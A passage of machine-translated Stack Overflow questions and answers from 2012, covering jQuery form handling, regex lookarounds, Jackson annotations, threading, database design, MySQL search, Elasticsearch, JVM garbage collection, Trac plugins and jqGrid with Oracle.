不完美，并且具有相当高的 PITA 值。尽管如此，jsdoc 仍将确保您正确获取任何不受支持的标签的语法，非常适合可移植性。

# javascript - 阻止表单提交

> ID：12461755
> 
> 赞同：0
> 
> 时间：2012-09-17T14:46:09.167
> 
> 标签：javascript, jquery, jquery-events

我有这个：

```
$("#contact-frm-2").bind("jqv.form.result", function(event , errorFound){
    if(!errorFound){
        alert('go!');
        event.preventDefault();
        return false;                               
    }
}); 
```

它应该验证表单是否有错误，当表单上没有错误时，警告“Go！” 不提交。我正在使用您可以在[http://www.position-absolute.com/articles/jquery-form-validator-because-form-validation-is-a-mess/找到的 jquery.ValidationEngine.js](http://www.position-absolute.com/articles/jquery-form-validator-because-form-validation-is-a-mess/)

我确定

```
event.preventDefault();
            return false; 
```

应该阻止表单提交，但它仍在提交。有人能告诉我我错过了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:53:16.907

“ [onsubmit” JavaScript 事件](https://developer.mozilla.org/en-US/docs/DOM/form.submit)将为您处理这个问题。

jQuery：

```
$('#formid').submit(function(e) {
    e.preventDefault();
}); 
```

纯JS：

```
document.getElementById('formid').addEventListener('submit', function(e) {
    e.preventDefault();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-17T14:49:54.240

```
$('#form_id').submit(function(e) {
    e.preventDefault();
    //...
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:50:36.090

是的，`return false;`应该阻止您的表单被提交，但前提是您在实际`submit`事件中执行它。您上面的代码看起来像是依赖于插件。为什么不尝试在表单中的实际提交按钮上附加一个额外的侦听器。

```
$("#submit_btn").on('click',function(){
  return false;
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T15:45:37.160

该插件具有可以使用的选项。其中之一是 OnvalidationComplete，它的作用如下所示：

```
jQuery("#contact-frm-2").validationEngine('attach', {
   promptPosition : "centerRight", scroll: true,
   onValidationComplete: function(form, status){
   alert("The form status is: " +status+", it will never submit");
   }  
}); 
```

完整的文档在这里[http://posabsolute.github.com/jQuery-Validation-Engine/](http://posabsolute.github.com/jQuery-Validation-Engine/)

# regex - RegEx - 匹配分隔符，除非在（嵌套）尖括号内

> ID：12461757
> 
> 赞同：3
> 
> 时间：2012-09-17T14:46:11.790
> 
> 标签：regex, delphi, split, delimiter

我正在尝试按命名空间分隔符拆分以下（Delphi RTTI 输出）`.`：

```
System.Generics.Collections.TEnumerator<Utils.TPair<System.string,System.string>> 
```

正确的拆分应该是`[System, Generics, Collections, TEnumerator<Utils.TPair<System.string,System.string>>]`.

首先我尝试了一个否定的前瞻`\.(?!\<*[a-zA-Z0-9_.,]*\>)`，但它与`Utils.TPair`最左边的句点相匹配`System.string`。我可能会补充一点，我有点惊讶，它（正确地）匹配`Collections.TEnumerator`. 我想这证明了我对正则表达式语言的掌握。

因此，我尝试通过这样说来使其“更贪婪”：`\.(?!\<*[a-zA-Z0-9_.,<>]*\>)`，但没有找到匹配项。（我知道这不是正则表达式通常所说的“贪婪”的意思，但我想不出更合适的描述。）

所以我决定重新开始。据我了解，我应该能够使用消极的环视来解决我的问题。特别是：*任何匹配跟随`<`都可以有效地被忽略*。所以我决定[`(?<!\<[a-zA-Z0-9_]*)\.`](http://regexr.com?3265j)应该解决我的问题。它没有。这可能是由于（许多）否定后向实现不支持可变长度字符串这一事实。（具体来说，PCRE - 这基本上是 Delphi 使用的，显然支持可变长度的替代品。不过，每个替代品都必须在执行时固定。）

因此我转向你，社区。

谁能解释一下这个问题，实际上应该很简单？会很好！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:50:42.800

试试这个正则表达式：

```
\.(?![^.]*[\w_.,]*>) 
```

它的基本意思是：匹配所有`.`没有在 a und`.`之前的 a之后的，因此在 a 内。它实际上非常仅限于您的示例。`>``<>`

见[红字](http://www.rubular.com/r/LuzaLtgX3f)

消极的lookbehind可以更好地解决这个任务：

```
(?<!<.{0,1000})\. 
```

这意味着匹配任何前面`.`没有的`<`。

我在java中试过这个并且它有效。Java 不允许有无限的后视，这就是为什么我使用 1000 的限制`{0,1000}`而不是`*`. 我不知道PCRE是否支持它。

# json - Jackson 2.0 与 Jackson 1.x 注释的兼容性？

> ID：12461760
> 
> 赞同：6
> 
> 时间：2012-09-17T14:46:26.843
> 
> 标签：json, jackson, backwards-compatibility

我有一个用 jackson 1.x 注释的旧框架类。我的应用程序使用 jackson 2.0 来处理 json 序列化。是否可以配置杰克逊 2.0 来理解“旧”注释？目前这些注释被简单地忽略了。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-17T20:51:10.383

没有开箱即用的配置，但实现 Jackson 2.0 AnnotationIntrospector（可能扩展`JacksonAnnotationIntrospector`）并使其使用 Jackson 1.x 注释作为 2.x 注释之外或代替 2.x 注释应该很容易。

事实上，你基本上可以只取 1.x`JacksonAnnotationIntrospector`并替换它的用法。

2.0 不支持也不会直接支持 1.x 注释的原因是它会引入额外的依赖项，并可能导致版本冲突。但这并不妨碍外部库这样做——事实上，如果有人想贡献，我相信 Jackson 项目会接受 github 的“Jackson 1.x annotations”模块。

# c++ - SFML 线程未并行运行

> ID：12461762
> 
> 赞同：1
> 
> 时间：2012-09-17T14:46:30.930
> 
> 标签：c++, multithreading, sfml

我正在尝试学习线程和互斥锁是如何工作的，但是我现在遇到了一些困惑，我从官方 SFML 1.6 教程中获取了以下代码：

```
#include <SFML/System.hpp>
#include <iostream>

void ThreadFunction(void* UserData)
{
    // Print something...
    for (int i = 0; i < 10; ++i)
        std::cout << "I'm the thread number 1" << std::endl;
}

int main()
{
    // Create a thread with our function
    sf::Thread Thread(&ThreadFunction);

    // Start it !
    Thread.Launch();

    // Print something...
    for (int i = 0; i < 10; ++i)
        std::cout << "I'm the main thread" << std::endl;

    return EXIT_SUCCESS;
} 
```

它说

> 因此，来自两个线程的文本将同时显示。

但是这并没有发生，它首先执行第一个线程然后执行第二个线程，它们不应该同时运行吗？我在 Windows XP SP3 上使用 Codeblocks IDE，运行 SFML 1.6。我做错了什么，还是我误解了它们的工作原理？从我的角度来看，线程应该同时执行，所以输出应该是这样的

“来自线程 1 的文本来自线程 2 的文本来自线程 1 的文本，依此类推”

![在此处输入图像描述](../Images/1cf75fe3764db96bfe356d15d827ec11.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:51:48.417

> ......他们不应该同时运行吗？

嗯，这取决于。

如果您有两个或更多核心，它们*可能会*同时运行。

即使您有可用的硬件，也取决于您的操作系统来决定如何安排您的线程：如果您想*鼓励*您的操作系统交错两个线程（如果没有更多工作就无法强制执行），请尝试添加`sleep`or`nanosleep`或`yield`调用您的循环（确切的原语将取决于您的平台）。

* * *

如果它可以帮助您建立关于内核如何以及为什么做出调度决策的直觉，请注意大多数 CPU 架构将保留大量状态（分支预测表、数据和指令缓存），这些状态非常适合优化单线程执行。

因此，让给定线程尽可能长时间地在给定内核上运行通常更有效，以最大限度地减少可避免的上下文切换、缓存未命中和错误预测的数量。

现在，时间片通常被用作在每个单独进程的最佳*吞吐量*与最佳*延迟*或对外部事件的响应之间的一种权衡。线程可能会阻塞（通过等待外部事件，例如用户输入或设备 I/O，因为它显式与另一个线程同步，或者显式休眠或让步），在这种情况下，另一个线程将被调度，而第一个线程不能取得进展，但否则它通常会运行，直到内核在其分配的时间片结束时抢占它。

当父线程创建子线程时，我不想猜测当前内核上哪个“更热”，因此让父线程完成其时间片（除非它阻塞）是合理的默认值。

子线程可能立即可运行，但如果它不抢占父线程，那么为什么它应该立即抢占不同核心上的线程也不是很明显。毕竟，它还是和父线程在同一个进程中，并且共享相同的内存、地址映射和其他资源：除非另一个核心*完全*空闲，否则调度子线程的最佳位置可能是与其父线程在同一个核心上，因为父级很有可能将这些共享资源保存在缓存中。

因此，您的线程没有交错的原因很可能是在进程退出之前*既不会*运行相当一部分时间片，也没有任何阻塞 I/O 或显式产生（stdout 不会阻塞该数据量，因为它很容易被缓冲）。

# database-design - 同一张表的八个外键

> ID：12461764
> 
> 赞同：0
> 
> 时间：2012-09-17T14:46:33.333
> 
> 标签：database-design

也许，我快疯了，最后我忘记了我学到的一切，但我对我正在设计的数据库模型有很多疑问。

这是我的问题：

我有一个包含 n 列的表，其中八列将具有三个可能的值：YES、NO、UNKNOWN。

我认为我可以使用另一个带有 PK 和描述的表，但我不确定我是否可以创建从一个表到同一个表的八个外键。

我的问题是：

我是否需要第二张表来存储 YES、NO 和 UNKNOWN？同一张表可以有八个外键吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T16:15:25.093

> 我是否需要第二张表来存储 YES、NO 和 UNKNOWN？

并不真地。为什么不直接使用 DBMS 提供的“bool”（或“bit”等）类型，其值为 TRUE（或 1 或其他）、FALSE（或 0）和 NULL？

或者，考虑一个简单的 INT，其中每个值都被记录并为所有客户“熟知”。如果 DBMS 支持它（MySQL），则为 ENUM。请不要将字符串用于逻辑上的布尔值或枚举 - 您最终会在许多重复的字符串上浪费空间。

只有在以下情况下，我才会考虑单独的表格：

*   值需要是动态的（即用户可以添加新值）
*   或者您需要为每个值提供附加信息（例如描述或评论）。

> 同一张表可以有八个外键吗？

同一个表可能是八个外键的父端点。同一张表也有可能（虽然很*臭*）是八个 FK 的子端点。

所以是的，这是可能的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-18T11:18:35.547

你没疯。

有一种数据建模方法，最终以表作为集线器，许多其他表通过 FK/PK 机制引用这些集线器。该设计称为“星型模式”。充当中心的表称为“事实表”。引用它们的表称为“维表”。还有另一种称为“雪花模式”的设计，其中维度表本身被其他表引用。

您不能设计既是星型又是规范化的模式。它们是两个不同的学科，每个学科都有其最佳适用领域。星型模式适用于数据仓库、数据集市和报告数据库。结果证明，生成复杂的分析查询非常容易。更新星型模式是一件非常痛苦的事情。出于这个原因，当您进行 OLTP 时，规范化设计效果更好。

星型模式最初是作为一种将所谓的“多维建模”转移到 SQL 数据库领域的方式而开发的。多维建模用于 Cognos 等数据立方体等结构中。

但是，星型模式的设计目标与您在问题中概述的目标非常不同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-17T14:54:02.680

毫无疑问，一个设计中可能有八个外键（但可能有一些 RDBMS 不允许这样做），但如果您将其视为解决方案，我确实想知道您正在建模哪个问题域。

外键描述了一种关系，其中具有外键的表将包含依赖于引用表中记录的记录。有八个引用来跟踪两个表中记录之间的一对一关系似乎有点奇怪。

特别是因为列只能有三个值。那将表达哪种关系？引用表中可以表示多少条记录？

如果没有更多细节，我会说您的设计已损坏。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-19T13:04:38.667

正如您所描述的，拥有外键是完全可以的。尝试一下。

当然，ENUM 也很好，只要您永远不会有更多的状态需要处理（例如“可能”），或者需要移动到可能不支持枚举的不同数据库。

# mysql - Mysql AND 使用多个关键字搜索多行

> ID：12461765
> 
> 赞同：1
> 
> 时间：2012-09-17T14:46:37.763
> 
> 标签：mysql, sql, search, sql-like

假设我有这张桌子：

```
id    |  field1  |  field2  |  field3  |  field4
 0    |  pear    |  peach   |  fruit   |  california
 1    |  apple   |  peas    |  xxxxxx  |  cupertino
 2    |  apple   |  peach   |  xxxxxx  |  san francisco 
```

如果用户搜索“apple peach”我想得到这条线

```
2    |  apple   |  peach   |  xxxxxx  |  san francisco 
```

搜索“applepie san francisco”或“applepeach fran”的预期结果相同

那么执行此操作的 mysql 请求是什么？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-17T14:49:57.657

```
SELECT 
   * 
FROM 
   your_table
WHERE 
   'apple' IN (field1, field2, field3) 
   AND 'peach' IN (field1, field2, field3) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:52:48.717

试试这个查询

```
SELECT * FROM TABLE_NAME WHERE CONCAT(field1, ' ', field2) = 'apple peach'; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:50:05.013

很简单，你想检查`field1`是“苹果”`field2`还是“桃子”，所以`WHERE field1='apple' AND field2='peach'`会这样做。

我觉得你想要的有点复杂。一种解决方案可能是将搜索词中的空格替换为逗号，然后使用`IN`SQL 运算符在其中进行搜索。

因此，以下内容可能会起作用：

```
SELECT ... FROM ... 
WHERE 
field1 IN ('apple','peach') OR 
field2 IN ('apple','peach') OR 
field3 IN ('apple','peach') OR  
field4 IN ('apple','peach') 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-17T14:50:41.510

您将使用某种参数来适应您的搜索。所以：

```
SELECT `id`, `field1`, `field2`, `field3`, `field4`
  FROM Table1
 WHERE whatyouarelookingfor_1 IN (field1, field2, field3) 
   AND whatyouarelookingfor_2 IN (field1, field2, field3) 
```

编辑以添加 IN 子句，因为以前它只从一个字段中选择

这是一个简单的查询，检查这个有效的**[SQL Fiddle 代码](http://sqlfiddle.com/#!2/8886e/2)**。

# javascript - Javascript 中独立 XULRunner SDK 应用程序的 Content-Policy xpcom 组件

> ID：12461771
> 
> 赞同：2
> 
> 时间：2012-09-17T14:46:55.957
> 
> 标签：javascript, sdk, xpcom, policy, xulrunner

我创建了一个小型浏览器，`XULRunner SDK 15`所有基本功能现在都可以使用（`back`、、`forward`等`refresh`）。我想使用Javascript 中的`nsIContentPolicy`接口和函数添加图像阻止功能。`shouldLoad`

我已经阅读了所有与此相关的文章和所有 Mozilla 网站；我已经使用该界面查看了、和类似插件的来源`AdBlock`，但我尝试过的任何方法都没有为我工作；始终加载图像。`NoScript``ImgLikeOpera`

谁能帮我创建组件？在图像开始加载之前，我可以使用哪些其他接口来阻止图像？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-10T02:08:58.667

使用 XULRunner [prefs.js](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/XULRunner/Debugging_XULRunner_applications)中的图像权限设置来执行此操作：

```
pref("permissions.default.image", 2); 
```

**参考**

*   [permissions.default.image 知识库文章](http://kb.mozillazine.org/Permissions.default.image)
*   [如何关闭图像加载](https://support.mozilla.org/en-US/questions/961547)
*   [怎么屏蔽图片](https://support.mozilla.org/en-US/questions/976872)

# html - JavaScript 在旋转的 iPad 上自动缩放

> ID：12461774
> 
> 赞同：1
> 
> 时间：2012-09-17T14:47:11.447
> 
> 标签：html, ipad, mobile-safari, viewport, screen-orientation

我的页面在横向模式下工作正常，但在纵向模式下，我必须缩小一点，然后才能适应屏幕。所以我想编写一个JavaScript，当我以纵向模式旋转时缩小或缩小我的页面

```
if(navigator.platform == 'iPad') {
        window.onorientationchange = function () {
            var orientation = window.orientation;
            // Look at the value of window.orientation:
            if (orientation === 0) {
                alert("iPad is in Portrait mode.");
                 // my code goes here 
                var viewportmeta = document.querySelector('meta[name="viewport"]');
                viewportmeta.content = 'width = 1003,initial-scale = 0.5, maximum-scale = 2.0, minimum-scale=0.7';

            }
            else if (orientation === 90) {
                // iPad is in Landscape mode. The screen is turned to the left.
            }
            else if (orientation === -90) {
                // iPad is in Landscape mode. The screen is turned to the right.
            }
        }

    } 
```

它看起来不错`scale = 0.5;`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T19:49:17.500

只是我用过`<meta name="viewport" content="width=640">` ，每一个都解决了

# iphone - 自动播放时在 AVQueuePlayer 中播放 AVPlayerItem

> ID：12461780
> 
> 赞同：0
> 
> 时间：2012-09-17T14:47:25.827
> 
> 标签：iphone, objective-c, ios, cocoa, avqueueplayer

我有一个 98% 完成的应用程序，最近我偶然发现了一个新引入的错误。该应用程序从来自播放列表的服务器播放 mp3（只是轨道 URL 的 JSON 列表，而不是 m3u 文件）。

一切都按预期工作，除非曲目播放完毕。那时会自动选择下一个曲目并更新 UI。但该曲目从未播放过。另外：`playbackLikelyToKeepUp`键值观察器没有被触发。我可以阅读该`duration`选定（未播放）AVPlayerItem 的...。所以它是一个有效的对象。

当我按“下一步”或在我的表格视图中选择一行时，一切都会正常工作。对我来说最奇怪的部分是用户事件（按“下一步”）和自动播放功能的代码完全相同。两者都`currentTrackIndex`在我的 PlaylistManager 上设置了一个，我观察它的变化。这会触发一个`playCurrentTrack`方法。

有没有可能与它有关`NSNotificationCenter`？
我用它来检查当前曲目是否已播放完毕，如下所示：

```
[[NSNotificationCenter defaultCenter]   addObserver:self
                                        selector:@selector(playerItemDidReachEnd:)
                                        name:AVPlayerItemDidPlayToEndTimeNotification
                                        object:self.currentAudioPlayerItem]; 
```

`playerItemDidReachEnd`看起来像这样：

```
- (void)playerItemDidReachEnd:(NSNotification *)notification {
    // same action as pressing 'next' button in my audioplayer UI controls
    // which is working, I can also see some UI updates ( correct title etc. … )
    [self pressedNext];
} 
```

我在想一些线程可能会阻止从 url 加载 mp3 时触发的事件？我看到 mp3 信息正在我的 http 流量工具中加载。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T10:31:51.353

我通过将一些类方法重新内联（热）解决了这个问题：

*   移动了我的共享音频播放器类内联
*   为每个新选择的 AVPlayerItem 创建一个新的音频播放器
*   当播放器到达终点时，使用一种更防错的方法来触发选择器：

    `-(void)playerItemDidReachEndNotification{
    // make sure we trigger the selector on the main thread
    [self performSelectorOnMainThread:@selector(playerItemDidReachEnd) withObject:nil waitUntilDone:NO];
    }`

我确信其中一些东西是不必要的，但主要目标是让它再次工作。
希望在下一次迭代中找到真正的罪魁祸首。

# mysql - 关于 count 和 group_by 的奇怪问题，可能不同

> ID：12461781
> 
> 赞同：0
> 
> 时间：2012-09-17T14:47:27.773
> 
> 标签：mysql, sql, sqlite

设想：

我有一个名为片段的表，有 5 行，我有一个名为修订的表，有 15 行

我想做的是获取所有片段，它属于`user_id`修订版，其中包括`snippet_id`.

我有以下mysql查询：

```
SELECT DISTINCT * FROM "snippets" 
INNER JOIN "revisions" 
    ON "user_id" = "1" 
    AND "snippet_id" = "snippets.id"
GROUP BY "snippets"."id" 
ORDER BY "created_at" 
```

那应该显示所有片段`revisions.user_id = 1`。问题是，为什么我的计数不同？该查询的总结果是**5**，但是当我这样做时：

```
SELECT COUNT(distinct snippets.id) FROM "snippets" 
INNER JOIN "revisions" 
    ON "user_id" = "1" 
    AND "snippet_id" = "snippets.id"
GROUP BY "snippets"."id"; 
```

结果是**1 1 1 1 1**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:51:23.533

没有任何意义`DISTINCT COUNT(*)`。可能是您正在寻找`COUNT(DISTINCT someotherfield)`而不是它。由于`COUNT(*)`包括任何具有`NULL`值的行。

**更新：***不要与您在子句`COUNT`中使用的字段相同。`GROUP BY`这就是你得到结果的原因`1 1 1 1 1`。在这种情况下，删除该`GROUP BY "snippets"."id"`子句。

# elasticsearch - Elasticsearch，过滤重音

> ID：12461783
> 
> 赞同：2
> 
> 时间：2012-09-17T14:47:36.190
> 
> 标签：elasticsearch

所以，虽然[asciifolding](http://www.elasticsearch.org/guide/reference/index-modules/analysis/asciifolding-tokenfilter.html)会`è`变成`e`它不会过滤掉一个像 的重音```，对吧？那么我怎样才能摆脱它们呢？例如，我想索引`O`Learys`并能够搜索 , , 的任何`olearys`变`O learys`体`o`learys`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-18T00:36:18.933

我认为不可能同时使用弹性搜索附带的分析器、标记器或过滤器来`O`Learys`匹配两者。它需要检测两次的存在和索引：首先作为一个令牌，然后作为两个令牌。不过，它可以通过仅使用自定义令牌过滤器编写来完成。`olearys``O learys`````O`Learys``olearys``o` `learys`

作为一种解决方法，您可以通过使用[Mapping Char Filter](http://www.elasticsearch.org/guide/reference/index-modules/analysis/mapping-charfilter.html)从输入中删除字符来同时进行`olearys`和`o`learys`匹配。`O`Learys````

# android - Google 和 Yahoo Signon 用于 Phonegap Stockmarket 应用程序

> ID：12461784
> 
> 赞同：0
> 
> 时间：2012-09-17T14:47:37.860
> 
> 标签：android, cordova, mobile-application, yahoo-finance, google-finance

任何人都可以建议我为我使用 PhoneGap 开发的 android 应用程序实现 Google 登录和雅虎登录的示例，我想将 google 和 yahoo 金融投资组合导入我的应用程序。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T19:32:46.487

在此处查找有关 google api 的更多信息：

[https://developers.google.com/accounts/](https://developers.google.com/accounts/)

在此处查找有关 yahoo api 的更多信息：

[http://developer.yahoo.com/auth/](http://developer.yahoo.com/auth/)

# c# - 用于忽略自定义转义字符的正则表达式模式

> ID：12461786
> 
> 赞同：1
> 
> 时间：2012-09-17T14:48:08.130
> 
> 标签：c#, regex

我正在尝试找到一个合适的正则表达式来匹配输入字符串中的一对自定义字符。这些自定义字符将替换为相应的 html 标记。

例如，输入字符串可以有成对的下划线来表示粗体字。因此， `_Name_`输出为`<b>Name</b>`

但是，如果字符串中有真正的下划线，则不能用“粗体”标签替换，必须忽略。真正的下划线必须在前面`/`（我找不到更好的字符，它可能是另一个下划线或连字符或其他）。正则表达式必须忽略此真正下划线的任何单个或成对出现。

到目前为止，我可以想出这个正则表达式：

```
var pattern = @"(?!/)_(.*?)(?!/)_"; 
```

但它在以下输入字符串中失败：

`_Tom_Katy/_Richard/_/_Stephan_and many users`

它输出为

```
<b>Tom</b>Katy/<b>Richard/_/</b>Stephan_and many users 
```

非常感谢提前，公关

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:52:08.353

试试这个

```
@"(?<!/)_([^/]+?)[^/]_" 
```

这会找到任何没有`/`内部的字符序列，如果您想包含`/`在搜索中，请尝试这种方式

```
@"(?<!\/)_(.+?)((?<!\/)_)" 
```

解释：

```
(?<!/)      # this is a negative lookbehind, it says "I don't want the previous char to be /
_           # finds the first _
([^/]+?)   # tells to search characters without / (in this case your names)
[^/]_"      # finds the last _ not preceded by / (maybe redundant seen the previous one) 
```

# java - 并发标记扫描收集发生的频率不够

> ID：12461788
> 
> 赞同：2
> 
> 时间：2012-09-17T14:48:14.033
> 
> 标签：java, garbage-collection, concurrent-mark-sweep

我的应用程序在具有 16 个处理器和 64 GB 内存的服务器上正确运行。我有多个进程，我尝试将我的进程的最大堆限制为 8 GB。

我的问题是我有某种形式的生产者-消费者模式，我必须限制生产速率，否则我会耗尽内存，因为老年代的垃圾收集发生得太少了。

*   当我监控我的应用程序时，我可以看到运行 4 小时后，我在 ParNEW 中花费了 7 分钟，在 ConcurrentMarkSweep 中花费了 0.775 秒。
*   我的堆占用上升到大约 6GB，然后下降到 1GB，然后慢慢开始上升到 6GB，然后再次下降。周期约为 10 分钟

通过 JVisualVM 我可以看到 90% 的内存占用是由 CMS Old Gen 给定的，如何强制并发标记扫描运行得更频繁一些？

* * *

@PeterLawrey 评论非常相关，因为我的应用程序运行在应用程序服务器的顶部，该应用程序服务器专为事件驱动处理和数据分区而设计，例如 Terracotta 或 Coherence。底层实现很可能包括用于事件处理的排队系统。

我的问题是限制堆大小不是解决方案，因为正如我所经历的那样，应用程序没有更频繁地进行垃圾收集，而是耗尽了内存。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T15:00:38.117

> 我必须限制生产速度，否则我会耗尽内存

如果您使用无界队列，就会发生这种情况。如果你的生产者超过了消费者的速率，队列可以无限增长，直到你的内存用完。限制生产者可以确保队列保持在合理的大小。

解决此问题的一种简单方法是在队列太长时延迟生产者。

```
private final BlockingQueue<Task> tasks = new ArrayBlockingQueue<Task>(1000);

// the producer slows when the queue length gets too long.
tasks.offer(newTask, 1, TimeUnit.HOURS); 
```

这将确保队列永远不会太长，但不会不必要地减慢生产者的速度。

BTW：与链接队列相比，使用 ArrayBlockingQueue 还可以减少产生的垃圾量。

如果你真的需要一个无界队列，你可以使用我写的一个库，但它的级别相对较低。[Java Chronicle](https://github.com/peter-lawrey/Java-Chronicle)生产者可以超过消费者的主内存大小。它仅受磁盘空间大小的限制。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:51:51.693

我认为通过设置较低的[初始占用率](http://www.oracle.com/technetwork/java/gc-tuning-5-138395.html#0.0.0.%20When%20to%20Use%20the%20Concurrent%20Low%20Pause%20Collector%7Coutline)，您可以触发频繁的收集。

```
-XX:CMSInitiatingOccupancyFraction=<nn> 
```

# plugins - 读取和处理 Trac 插件的上传文件

> ID：12461792
> 
> 赞同：0
> 
> 时间：2012-09-17T14:48:31.897
> 
> 标签：plugins, file-upload, http-post, trac

我正在尝试为[trac](http://trac.edgewall.org/)编写一个插件，但我错过了 sthg。在阅读了网站[trac](http://trac.edgewall.org/)制作的所有教程之后。因此，我尝试使用 POST 方法将文件上传到服务器，这是一个简化的示例：

```
<form id="MyForm" name="input" action="" method="post">
<label for="attachment">URL :</label>           
<input type="file" name="GanttFile" value=""/>
</form> 
```

现在我正在尝试处理上传的文件，阅读它并进行一些修改而不是保存它或要求用户选择他想要保存文件的位置（从 trac 数据库中导出一些数据）......我仍然被阻止在这个级别：

```
def process_request(self, req):
    data = {}
    if req.method=='POST':
        file=req.args.get('GanttFile', 'value')
        # and now I'm blocked !! how can I modify this file 
        # and then redirect or save it ! 
```

如果我尝试显示变量**文件**的内容，我只会得到文件名而不是所有路径？通过做这样的事情：

```
<input type="text" name="file" value ="$myfile" /> 
```

在我的源代码中：

```
def process_request(self, req):
    data = {}
    if req.method=='POST':
        file=req.args.get('GanttFile', 'value')
        # display the content 
        data.update({
            'myfile': file
        }) 
```

任何想法或想法？
谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T17:40:24.080

添加`file = os.path.basename(file)`会将路径修剪为仅文件名，这应该会导致 IE 版本的行为类似于 Firefox 版本（Firefox 版本应该不受影响）。

有关您尝试执行的操作类型的示例，请参阅 Trac 的[`web_ui.py`](http://trac.edgewall.org/browser/trunk/trac/admin/web_ui.py). 具体来说，看一下`PluginAdminPanel`类`_do_install`方法的代码。`.egg`这是通过管理员的 Web UI上传文件来安装新插件时使用的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-19T12:51:03.590

我有一个解决方案：
Python 类：

```
class ProjectPlugin(Component):
implements(INavigationContributor, IRequestHandler, ITemplateProvider)

# INavigationContributor methods
def get_active_navigation_item(self, req):
    return 'helloworldv2linkIdentifier'

def get_navigation_items(self, req):
    yield ('mainnav', 'helloworldv2linkIdentifier',
           tag.a('Gantt Export', href=req.href.myapppp()))

# IRequestHandler methods
def match_request(self, req):
    return re.match(r'/myapppp(?:_trac)?(?:/.*)?$', req.path_info)

def process_request(self, req):
# add the implements and chek the imports ! and the indents

    data = {}
    if req.method=='POST':
        if 'DispFile' in req.args:
            myFile=req.args.get('Fily','value')
            data.update({
                'myFile': myFile
            })
            dummy=req.args.get('Fily','value').filename
            data.update({
                    'dummy': dummy
                })
            # file  reading
            mystream = myFile.file.read()

    # This tuple is for Genshi (template_name, data, content_type)
    # Without data the trac layout will not appear.
    return 'GanttTemplate.html', data, None

# ITemplateProvider methods
# Used to add the plugin's templates and htdocs
def get_templates_dirs(self):
    from pkg_resources import resource_filename
    return [resource_filename(__name__, 'templates')]

def get_htdocs_dirs(self):
    return [] 
```

这是本例 GanttTemplate.html 文件中的 html 代码：

```
<!DOCTYPE html
PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"
  xmlns:py="http://genshi.edgewall.org/"
  xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include href="layout.html" />

<head>
 <title>Gant Export Tool</title>
</head>

<body> 

<form id="GanttForm1" name="inputForm2" action="" method="POST"     enctype="multipart/form-data">       
    <fieldset id="operations" >
        <legend >
            Configuration
        </legend>

        <label for="Fily">URL :</label>           
        <input type="file" name="Fily" value=""/><br /><br />
        Dummy variable = $dummy            <br/>
        <input type="submit" name="DispFile" value="Display the file"/><br /><br />
    </fieldset>
</form>
<br /><br /><br /><br /><br /> 
```

谢谢 ！

# php - jQGrid 与 Oracle 数据库

> ID：12461793
> 
> 赞同：1
> 
> 时间：2012-09-17T14:48:36.487
> 
> 标签：php, javascript, jquery, oracle, jqgrid-php

我正在将 jqgrid 与 oracle 数据库一起使用。根本的问题是，看起来一切都是正确的，不仅显示数据库表中的信息。我把所有可能对我有帮助的代码都留在这里。

书本.php

```
<?php
    //database setting
    $dbuser='system';
    $dbpassword='manager';
    $database='orcl';
    $page = 2;
    // get the requested page
    $limit = 10;
    // connect to the database
    $db = oci_connect($dbuser, $dbpassword, $database) or die("Connection Error: " . oci_error());
    $result = oci_parse($db, 'SELECT COUNT(*) AS count from aaz');
    oci_execute($result);

    $row = oci_fetch_array ($result);
    $count = $row[0];
    if( $count > 0 ) 
    {
         $total_pages = ceil($count/$limit);
    }
    else {
         $total_pages = 0;
    }

    if ($page > $total_pages) $page=$total_pages;
    $start = $limit*$page - $limit; // do not put $limit*($page - 1)
    $SQL = "SELECT * FROM aaz where rownum <=$limit ORDER BY id";
    $result = oci_parse($db, $SQL) or die("Couldn t execute query.".oci_error());    
    oci_execute($result);

    $responce->page = $page;
    $responce->total = $total_pages;
    $responce->records = $count;
    $i=0;
    while($row = oci_fetch_array($result,OCI_ASSOC)) 
    {
        $responce->rows[$i]['id']=$row[ID];
        $responce->rows[$i]['cell']=array($row[ID],$row[FIRSTNAME],$row[LASTNAME],$row[PHONE],$row[EMAIL]);
        $i++;
    }
    echo json_encode($responce);     
?> 
```

索引.php

```
 <html>
<head>
<title>jQGrid example</title>
<!-- Load CSS--><br />
<link rel="stylesheet" href="css/ui.jqgrid.css" type="text/css" media="all" />
<!-- For this theme, download your own from link above, and place it at css folder -->
<link rel="stylesheet" href="css/ui-lightness/jquery-ui-1.8.23.custom.css" type="text/css" media="all" />
<!-- Load Javascript -->
